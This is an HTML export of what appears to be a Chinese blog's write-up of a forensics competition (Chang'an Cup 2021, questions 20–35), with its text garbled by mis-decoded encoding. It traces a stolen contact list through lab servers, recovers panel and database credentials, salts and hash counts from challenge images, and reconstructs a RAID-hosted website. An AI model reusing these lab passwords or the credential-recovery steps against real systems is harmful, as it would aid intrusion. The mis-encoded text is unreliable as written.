title="è¯·åˆ†æï¼Œå—å®³è€…é€šè®¯å½•è¢«è·å–æ—¶ï¼Œå…¶è®¾å¤‡çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘"></a>è¯·åˆ†æï¼Œå—å®³è€…é€šè®¯å½•è¢«è·å–æ—¶ï¼Œå…¶è®¾å¤‡çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘</h3><p>æŸ¥çœ‹æ—¥å¿—ç›®å½•ï¼Œå‘ç°å—å®³è€…é€šä¿¡å½•è¢«è·å–æ—¶ï¼Œå³4.24ï¼Œåªå­˜åœ¨ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506173549926.png"><br>æŸ¥çœ‹å¾—åˆ°<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506173631233.png"><br>å³<code>192.168.110.252</code></p><h2 id="ç¬¬äºŒåä¸€é¢˜"><a href="#ç¬¬äºŒåä¸€é¢˜" class="headerlink" title="ç¬¬äºŒåä¸€é¢˜"></a>ç¬¬äºŒåä¸€é¢˜</h2><h3 id="è¯·åˆ†æï¼Œå—å®³è€…çš„é€šè®¯å½•è¢«çªƒå–ä¹‹åï¼Œç»ç”±è¯¥æœåŠ¡å™¨è½¬å‘åˆ°äº†IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼-å¼ï¼š111-111-111-111ã€‘"><a href="#è¯·åˆ†æï¼Œå—å®³è€…çš„é€šè®¯å½•è¢«çªƒå–ä¹‹åï¼Œç»ç”±è¯¥æœåŠ¡å™¨è½¬å‘åˆ°äº†IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼-å¼ï¼š111-111-111-111ã€‘" class="headerlink" title="è¯·åˆ†æï¼Œå—å®³è€…çš„é€šè®¯å½•è¢«çªƒå–ä¹‹åï¼Œç»ç”±è¯¥æœåŠ¡å™¨è½¬å‘åˆ°äº†IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼ å¼ï¼š111.111.111.111ã€‘"></a>è¯·åˆ†æï¼Œå—å®³è€…çš„é€šè®¯å½•è¢«çªƒå–ä¹‹åï¼Œç»ç”±è¯¥æœåŠ¡å™¨è½¬å‘åˆ°äº†IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼ å¼ï¼š111.111.111.111ã€‘</h3><p>ç”±ä¸Šé¢˜å¯çŸ¥ï¼Œè½¬å‘åˆ°äº†<br><code>192.168.110.113</code></p><h2 id="ç¬¬äºŒåäºŒé¢˜"><a href="#ç¬¬äºŒåäºŒé¢˜" class="headerlink" title="ç¬¬äºŒåäºŒé¢˜"></a>ç¬¬äºŒåäºŒé¢˜</h2><h3 id="æ£€æä¸‰çš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š"><a href="#æ£€æä¸‰çš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š" class="headerlink" title="æ£€æä¸‰çš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š"></a>æ£€æä¸‰çš„åŸå§‹ç¡¬ç›˜çš„SHA256å€¼ä¸ºï¼š</h3><p>æŒ‚è½½å¯†ç ï¼š<code>192.168.110.113-CAB2021</code><br>ç”±ä¸Šè¾¹åˆ†æå¯çŸ¥ï¼Œæœ€åè¢«è½¬å‘åˆ°äº†ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼Œå› æ­¤ä½¿ç”¨x-waysæ¢å¤é•œåƒæ–‡ä»¶è®¡ç®—shaå€¼</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">205C1120874CE0E24ABFB3BB1525ACF330E05111E4AD1D323F3DEE59265306BF<br></code></pre></td></tr></table></figure><h2 id="ç¬¬äºŒåä¸‰é¢˜"><a href="#ç¬¬äºŒåä¸‰é¢˜" class="headerlink" title="ç¬¬äºŒåä¸‰é¢˜"></a>ç¬¬äºŒåä¸‰é¢˜</h2><h3 id="è¯·åˆ†æç¬¬21é¢˜ä¸­ï¼Œæ‰€æŒ‡çš„æœåŠ¡å™¨çš„å¼€æœºå¯†ç ä¸ºï¼š"><a href="#è¯·åˆ†æç¬¬21é¢˜ä¸­ï¼Œæ‰€æŒ‡çš„æœåŠ¡å™¨çš„å¼€æœºå¯†ç ä¸ºï¼š" class="headerlink" title="è¯·åˆ†æç¬¬21é¢˜ä¸­ï¼Œæ‰€æŒ‡çš„æœåŠ¡å™¨çš„å¼€æœºå¯†ç ä¸ºï¼š"></a>è¯·åˆ†æç¬¬21é¢˜ä¸­ï¼Œæ‰€æŒ‡çš„æœåŠ¡å™¨çš„å¼€æœºå¯†ç ä¸ºï¼š</h3><p>Linuxå¯†ç ä¿¡æ¯ä¿å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«ä¸ºï¼š<code>/etc/passwd</code>å’Œ<code>/etc/shadow</code></p><h2 id="ç¬¬äºŒåå››é¢˜"><a href="#ç¬¬äºŒåå››é¢˜" class="headerlink" title="ç¬¬äºŒåå››é¢˜"></a>ç¬¬äºŒåå››é¢˜</h2><h3 id="å«Œç–‘äººæ¶è®¾ç½‘ç«™ä½¿ç”¨äº†å®å¡”é¢æ¿ï¼Œè¯·é—®é¢æ¿çš„ç™»é™†ç”¨æˆ·åä¸ºï¼š"><a href="#å«Œç–‘äººæ¶è®¾ç½‘ç«™ä½¿ç”¨äº†å®å¡”é¢æ¿ï¼Œè¯·é—®é¢æ¿çš„ç™»é™†ç”¨æˆ·åä¸ºï¼š" class="headerlink" title="å«Œç–‘äººæ¶è®¾ç½‘ç«™ä½¿ç”¨äº†å®å¡”é¢æ¿ï¼Œè¯·é—®é¢æ¿çš„ç™»é™†ç”¨æˆ·åä¸ºï¼š"></a>å«Œç–‘äººæ¶è®¾ç½‘ç«™ä½¿ç”¨äº†å®å¡”é¢æ¿ï¼Œè¯·é—®é¢æ¿çš„ç™»é™†ç”¨æˆ·åä¸ºï¼š</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506210329895.png"><br>ä»¿çœŸåˆ†æï¼Œå¾—åˆ°ç”¨æˆ·åä¸º<code>hl123</code></p><h2 id="ç¬¬äºŒåäº”é¢˜"><a href="#ç¬¬äºŒåäº”é¢˜" class="headerlink" title="ç¬¬äºŒåäº”é¢˜"></a>ç¬¬äºŒåäº”é¢˜</h2><h3 id="è¯·åˆ†æç”¨äºé‡ç½®å®å¡”é¢æ¿å¯†ç çš„å‡½æ•°åä¸º"><a href="#è¯·åˆ†æç”¨äºé‡ç½®å®å¡”é¢æ¿å¯†ç çš„å‡½æ•°åä¸º" class="headerlink" title="è¯·åˆ†æç”¨äºé‡ç½®å®å¡”é¢æ¿å¯†ç çš„å‡½æ•°åä¸º"></a>è¯·åˆ†æç”¨äºé‡ç½®å®å¡”é¢æ¿å¯†ç çš„å‡½æ•°åä¸º</h3><p>å®å¡”é¢æ¿é‡ç½®ç½‘ç«™å¯†ç åŠŸèƒ½è°ƒç”¨çš„æ˜¯<code>/www/server/panel/tools.py</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212351998.png"><br>å› æ­¤ä¸º<code>set_panel_pwd</code></p><h2 id="ç¬¬äºŒåå…­é¢˜"><a href="#ç¬¬äºŒåå…­é¢˜" class="headerlink" title="ç¬¬äºŒåå…­é¢˜"></a>ç¬¬äºŒåå…­é¢˜</h2><h3 id="è¯·åˆ†æå®å¡”é¢æ¿ç™»é™†å¯†ç çš„åŠ å¯†æ–¹å¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¸º"><a href="#è¯·åˆ†æå®å¡”é¢æ¿ç™»é™†å¯†ç çš„åŠ å¯†æ–¹å¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¸º" class="headerlink" title="è¯·åˆ†æå®å¡”é¢æ¿ç™»é™†å¯†ç çš„åŠ å¯†æ–¹å¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¸º"></a>è¯·åˆ†æå®å¡”é¢æ¿ç™»é™†å¯†ç çš„åŠ å¯†æ–¹å¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¸º</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212534263.png"><br>å“ˆå¸Œç®—æ³•ä¸º<code>md5</code></p><h2 id="ç¬¬äºŒåä¸ƒé¢˜"><a href="#ç¬¬äºŒåä¸ƒé¢˜" class="headerlink" title="ç¬¬äºŒåä¸ƒé¢˜"></a>ç¬¬äºŒåä¸ƒé¢˜</h2><h3 id="è¯·åˆ†æå®å¡”é¢æ¿å¯¹äºå…¶é»˜è®¤ç”¨æˆ·çš„å¯†ç ä¸€å…±æ‰§è¡Œäº†å‡ æ¬¡ä¸Šé¢˜ä¸­çš„å“ˆå¸Œç®—æ³•"><a href="#è¯·åˆ†æå®å¡”é¢æ¿å¯¹äºå…¶é»˜è®¤ç”¨æˆ·çš„å¯†ç ä¸€å…±æ‰§è¡Œäº†å‡ æ¬¡ä¸Šé¢˜ä¸­çš„å“ˆå¸Œç®—æ³•" class="headerlink" title="è¯·åˆ†æå®å¡”é¢æ¿å¯¹äºå…¶é»˜è®¤ç”¨æˆ·çš„å¯†ç ä¸€å…±æ‰§è¡Œäº†å‡ æ¬¡ä¸Šé¢˜ä¸­çš„å“ˆå¸Œç®—æ³•"></a>è¯·åˆ†æå®å¡”é¢æ¿å¯¹äºå…¶é»˜è®¤ç”¨æˆ·çš„å¯†ç ä¸€å…±æ‰§è¡Œäº†å‡ æ¬¡ä¸Šé¢˜ä¸­çš„å“ˆå¸Œç®—æ³•</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212855249.png"><br>æ‰¾åˆ°<code>public</code>æ¨¡å—çš„å¯¼å…¥æ–‡ä»¶<code>public.py</code>ï¼ŒæŸ¥çœ‹å¾—åˆ°<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506213204658.png"><br>å‘ç°<code>password_salt</code>æ–‡ä»¶æœ‰ä¸¤æ¬¡md5ï¼ŒåŠ ä¸Šä¹‹å‰çš„ä¸€æ¬¡ï¼Œå…±<code>3</code>æ¬¡</p><h2 id="ç¬¬äºŒåå…«é¢˜"><a href="#ç¬¬äºŒåå…«é¢˜" class="headerlink" title="ç¬¬äºŒåå…«é¢˜"></a>ç¬¬äºŒåå…«é¢˜</h2><h3 id="è¯·åˆ†æå½“å‰å®å¡”é¢æ¿å¯†ç åŠ å¯†è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„saltå€¼ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘"><a href="#è¯·åˆ†æå½“å‰å®å¡”é¢æ¿å¯†ç åŠ å¯†è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„saltå€¼ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘" class="headerlink" title="è¯·åˆ†æå½“å‰å®å¡”é¢æ¿å¯†ç åŠ å¯†è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„saltå€¼ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘"></a>è¯·åˆ†æå½“å‰å®å¡”é¢æ¿å¯†ç åŠ å¯†è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„saltå€¼ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506213800029.png"><br>å‘ç°è®¿é—®çš„æ˜¯<code>data/default.db</code>æ•°æ®åº“ï¼ŒæŸ¥çœ‹å¾—åˆ°<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214117926.png"><br>saltä¸º<code>v87ilhAVumZL</code></p><h2 id="ç¬¬äºŒåä¹é¢˜"><a href="#ç¬¬äºŒåä¹é¢˜" class="headerlink" title="ç¬¬äºŒåä¹é¢˜"></a>ç¬¬äºŒåä¹é¢˜</h2><h3 id="è¯·åˆ†æè¯¥æœåŠ¡å™¨ï¼Œç½‘ç«™æºä»£ç æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ä¸ºã€æ ‡å‡†æ ¼å¼-xxx-xxx-xxxã€‘"><a href="#è¯·åˆ†æè¯¥æœåŠ¡å™¨ï¼Œç½‘ç«™æºä»£ç æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ä¸ºã€æ ‡å‡†æ ¼å¼-xxx-xxx-xxxã€‘" class="headerlink" title="è¯·åˆ†æè¯¥æœåŠ¡å™¨ï¼Œç½‘ç«™æºä»£ç æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ä¸ºã€æ ‡å‡†æ ¼å¼&#x2F;xxx&#x2F;xxx&#x2F;xxxã€‘"></a>è¯·åˆ†æè¯¥æœåŠ¡å™¨ï¼Œç½‘ç«™æºä»£ç æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ä¸ºã€æ ‡å‡†æ ¼å¼&#x2F;xxx&#x2F;xxx&#x2F;xxxã€‘</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214346314.png"><br>ç«çœ¼ä¸­æŸ¥çœ‹å¾—åˆ°<code>/www/wwwroot/www.honglian7001</code></p><h2 id="ç¬¬ä¸‰åé¢˜"><a href="#ç¬¬ä¸‰åé¢˜" class="headerlink" title="ç¬¬ä¸‰åé¢˜"></a>ç¬¬ä¸‰åé¢˜</h2><h3 id="è¯·åˆ†æï¼Œç½‘ç«™æ‰€ä½¿ç”¨çš„æ•°æ®åº“ä½äºIPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šï¼ˆè¯·ä½¿ç”¨è¯¥IPè§£å‹æ£€æ5ï¼Œå¹¶é‡æ„ç½‘-ç«™ï¼‰ã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘"><a href="#è¯·åˆ†æï¼Œç½‘ç«™æ‰€ä½¿ç”¨çš„æ•°æ®åº“ä½äºIPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šï¼ˆè¯·ä½¿ç”¨è¯¥IPè§£å‹æ£€æ5ï¼Œå¹¶é‡æ„ç½‘-ç«™ï¼‰ã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘" class="headerlink" title="è¯·åˆ†æï¼Œç½‘ç«™æ‰€ä½¿ç”¨çš„æ•°æ®åº“ä½äºIPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šï¼ˆè¯·ä½¿ç”¨è¯¥IPè§£å‹æ£€æ5ï¼Œå¹¶é‡æ„ç½‘ ç«™ï¼‰ã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘"></a>è¯·åˆ†æï¼Œç½‘ç«™æ‰€ä½¿ç”¨çš„æ•°æ®åº“ä½äºIPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šï¼ˆè¯·ä½¿ç”¨è¯¥IPè§£å‹æ£€æ5ï¼Œå¹¶é‡æ„ç½‘ ç«™ï¼‰ã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘</h3><p>æ‰¾åˆ°ç½‘ç«™æ•°æ®åº“ç›¸å…³æ–‡ä»¶<code>www/wwwroot/www.honglian7001/app/database.php</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214726041.png"><br> å¾—åˆ°IPåœ°å€<code>192.168.110.115</code></p><h2 id="ç¬¬ä¸‰åä¸€é¢˜"><a href="#ç¬¬ä¸‰åä¸€é¢˜" class="headerlink" title="ç¬¬ä¸‰åä¸€é¢˜"></a>ç¬¬ä¸‰åä¸€é¢˜</h2><h3 id="è¯·åˆ†æï¼Œæ•°æ®åº“çš„ç™»é™†å¯†ç ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘"><a href="#è¯·åˆ†æï¼Œæ•°æ®åº“çš„ç™»é™†å¯†ç ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘" class="headerlink" title="è¯·åˆ†æï¼Œæ•°æ®åº“çš„ç™»é™†å¯†ç ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘"></a>è¯·åˆ†æï¼Œæ•°æ®åº“çš„ç™»é™†å¯†ç ä¸ºã€åŒºåˆ†å¤§å°å†™ã€‘</h3><p>åŒä¸Šå›¾ç‰‡ä¸­ï¼š<br><code>wxrM5GtNXk5k5EPX</code></p><h2 id="ç¬¬ä¸‰åäºŒé¢˜"><a href="#ç¬¬ä¸‰åäºŒé¢˜" class="headerlink" title="ç¬¬ä¸‰åäºŒé¢˜"></a>ç¬¬ä¸‰åäºŒé¢˜</h2><h3 id="è¯·å°è¯•é‡æ„è¯¥ç½‘ç«™ï¼Œå¹¶æŒ‡å‡ºï¼Œè¯¥ç½‘ç«™çš„åå°ç®¡ç†ç•Œé¢çš„å…¥å£ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š-webã€‘"><a href="#è¯·å°è¯•é‡æ„è¯¥ç½‘ç«™ï¼Œå¹¶æŒ‡å‡ºï¼Œè¯¥ç½‘ç«™çš„åå°ç®¡ç†ç•Œé¢çš„å…¥å£ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š-webã€‘" class="headerlink" title="è¯·å°è¯•é‡æ„è¯¥ç½‘ç«™ï¼Œå¹¶æŒ‡å‡ºï¼Œè¯¥ç½‘ç«™çš„åå°ç®¡ç†ç•Œé¢çš„å…¥å£ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š&#x2F;webã€‘"></a>è¯·å°è¯•é‡æ„è¯¥ç½‘ç«™ï¼Œå¹¶æŒ‡å‡ºï¼Œè¯¥ç½‘ç«™çš„åå°ç®¡ç†ç•Œé¢çš„å…¥å£ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š&#x2F;webã€‘</h3><p>æŸ¥çœ‹<code>/admin/common.php</code>å‘ç°æ˜¯åå°ç®¡ç†æ–‡ä»¶ï¼Œ<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506220009033.png"><br>åå°ç®¡ç†å…¥å£ä¸ºï¼š<code>/admin</code></p><p>Raidé‡ç»„ç½‘ç«™<br>å…ˆå°†<code>æ£€æäº”001.zip</code>è§£å‹å¾—åˆ°<code>æ£€æäº”001.txt</code>ï¼Œç„¶åç”¨VeraCryptæŒ‚è½½ï¼ŒæŒ‚è½½å¯†ç ä¸º<code>192.168.110.115-CAB2021</code><br>ä½¿ç”¨<code>FTK image</code>æŒ‚è½½å¾—åˆ°çš„3ä¸ªddæ–‡ä»¶ï¼ŒæŒ‚è½½æ¨¡å¼é€‰æ‹©å¯å†™ã€‚<br>åœ¨R-studioä¸­åˆ›å»ºè™šæ‹Ÿå·ç»„å’ŒRAIDï¼Œç„¶åå°†è¿™å‡ ä¸ªç£ç›˜ç§»å…¥ï¼Œè¿›è¡Œè‡ªåŠ¨æ£€æµ‹<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506225022105.png"><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506225410033.png"><br>ä¹‹åè¿›è¡Œåˆ›å»ºé•œåƒ,ç„¶åè¿›è¡Œä»¿çœŸï¼Œæ­¤æ—¶è®¿é—®<code>http://192.168.110.113/admin/common/login.shtml</code></p><h2 id="ç¬¬ä¸‰åä¸‰é¢˜"><a href="#ç¬¬ä¸‰åä¸‰é¢˜" class="headerlink" title="ç¬¬ä¸‰åä¸‰é¢˜"></a>ç¬¬ä¸‰åä¸‰é¢˜</h2><h3 id="å·²è¯¥æ¶‰æ¡ˆç½‘ç«™ä»£ç ä¸­å¯¹ç™»å½•ç”¨æˆ·çš„å¯†ç åšäº†åŠ å¯†å¤„ç†ã€‚è¯·æ‰¾å‡ºåŠ å¯†ç®—æ³•ä¸­çš„saltå€¼ã€åŒºåˆ†å¤§å°å†™ã€‘"><a href="#å·²è¯¥æ¶‰æ¡ˆç½‘ç«™ä»£ç ä¸­å¯¹ç™»å½•ç”¨æˆ·çš„å¯†ç åšäº†åŠ å¯†å¤„ç†ã€‚è¯·æ‰¾å‡ºåŠ å¯†ç®—æ³•ä¸­çš„saltå€¼ã€åŒºåˆ†å¤§å°å†™ã€‘" class="headerlink" title="å·²è¯¥æ¶‰æ¡ˆç½‘ç«™ä»£ç ä¸­å¯¹ç™»å½•ç”¨æˆ·çš„å¯†ç åšäº†åŠ å¯†å¤„ç†ã€‚è¯·æ‰¾å‡ºåŠ å¯†ç®—æ³•ä¸­çš„saltå€¼ã€åŒºåˆ†å¤§å°å†™ã€‘"></a>å·²è¯¥æ¶‰æ¡ˆç½‘ç«™ä»£ç ä¸­å¯¹ç™»å½•ç”¨æˆ·çš„å¯†ç åšäº†åŠ å¯†å¤„ç†ã€‚è¯·æ‰¾å‡ºåŠ å¯†ç®—æ³•ä¸­çš„saltå€¼ã€åŒºåˆ†å¤§å°å†™ã€‘</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506233546876.png"><br>å¯ä»¥çœ‹å‡ºsaltå€¼ä¸ºï¼š<code>lshi4AsSUrUOwWV</code></p><h2 id="ç¬¬ä¸‰åå››é¢˜"><a href="#ç¬¬ä¸‰åå››é¢˜" class="headerlink" title="ç¬¬ä¸‰åå››é¢˜"></a>ç¬¬ä¸‰åå››é¢˜</h2><h3 id="è¯·åˆ†æè¯¥ç½‘ç«™çš„ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ä¸º"><a href="#è¯·åˆ†æè¯¥ç½‘ç«™çš„ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ä¸º" class="headerlink" title="è¯·åˆ†æè¯¥ç½‘ç«™çš„ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ä¸º"></a>è¯·åˆ†æè¯¥ç½‘ç«™çš„ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ä¸º</h3><p>æŸ¥çœ‹è¿è¡Œæ—¥å¿—<code>www.honglian7001/runtime/log/202104/24.log</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234346423.png"><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234525867.png"><br>å‘ç°ä¸¤ä¸ªï¼Œå°è¯•ä¹‹åå¾—åˆ°å¯†ç ä¸ºï¼š<code>security</code></p><h2 id="ç¬¬ä¸‰åäº”é¢˜"><a href="#ç¬¬ä¸‰åäº”é¢˜" class="headerlink" title="ç¬¬ä¸‰åäº”é¢˜"></a>ç¬¬ä¸‰åäº”é¢˜</h2><h3 id="åœ¨å¯¹åå°è´¦å·çš„å¯†ç åŠ å¯†å¤„ç†è¿‡ç¨‹ä¸­ï¼Œåå°ä¸€å…±è®¡ç®—å‡ æ¬¡å“ˆå¸Œå€¼"><a href="#åœ¨å¯¹åå°è´¦å·çš„å¯†ç åŠ å¯†å¤„ç†è¿‡ç¨‹ä¸­ï¼Œåå°ä¸€å…±è®¡ç®—å‡ æ¬¡å“ˆå¸Œå€¼" class="headerlink" title="åœ¨å¯¹åå°è´¦å·çš„å¯†ç åŠ å¯†å¤„ç†è¿‡ç¨‹ä¸­ï¼Œåå°ä¸€å…±è®¡ç®—å‡ æ¬¡å“ˆå¸Œå€¼"></a>åœ¨å¯¹åå°è´¦å·çš„å¯†ç åŠ å¯†å¤„ç†è¿‡ç¨‹ä¸­ï¼Œåå°ä¸€å…±è®¡ç®—å‡ æ¬¡å“ˆå¸Œå€¼</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234643140.png"><br><code>3</code>æ¬¡</p><h1 id="çƒ‚å°¾â€¦"><a href="#çƒ‚å°¾â€¦" class="headerlink" title="çƒ‚å°¾â€¦"></a>çƒ‚å°¾â€¦</h1><p>åç»­çš„é¢˜ç›®ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œå¤ç°å¤±è´¥äº†ï¼Œçœ‹æ¥æœ¬æ¬¡ä¹Ÿåªèƒ½çƒ‚å°¾äº†ã€‚<br>æœ¬æ¥è¿™æ¬¡å¤ç°å°±æ˜¯ç»™ç›˜å¤çŸ³æ¯åšå‡†å¤‡ï¼Œç°åœ¨ç›˜å¤çŸ³æ¯å·²ç»æ¯”å®Œäº†ï¼ˆå­¦äº†å‡ å¤©æ‹¼å°½å…¨åŠ›ä¹Ÿåªæ··åˆ°äº†ä¸€ä¸ªäºŒç­‰å¥–ï¼Œè¿˜å¤šäºé˜Ÿå‹å¸¦é£â”­â”®ï¹â”­â”®ï¼‰ï¼Œç­‰ä¸‹æ¬¡ç¾äºšæ¯å†ç»§ç»­å­¦ä¹ å–è¯å§ï¼ˆæºœäº†æºœäº†â€¦ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-MT19937</title>
    <link href="/2025/04/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-MT19937/"/>
    <url>/2025/04/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-MT19937/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>æ¢…æ£®æ—‹è½¬ï¼ˆMersenne Twisterï¼‰æ˜¯ä¸€ä¸ªPRNGï¼ˆä¼ªéšæœºæ•°å‘ç”Ÿå™¨ï¼‰ï¼ŒåŸºäºæœ‰é™äºŒè¿›åˆ¶å­—æ®µä¸Šçš„çŸ©é˜µçº¿æ€§é€’å½’ï¼Œå¯å¿«é€Ÿäº§ç”Ÿé«˜è´¨é‡çš„ä¼ªéšæœºæ•°ï¼Œå‘¨æœŸä¸º$2^{19937}-1$ï¼Œä¹Ÿå°±æ˜¯19937bitsã€‚<br>pythonä¸­çš„randomåº“ä½¿ç”¨çš„ä¾¿æ˜¯è¿™ç§ç®—æ³•ã€‚</p><h3 id="å®ç°æ­¥éª¤ï¼š"><a href="#å®ç°æ­¥éª¤ï¼š" class="headerlink" 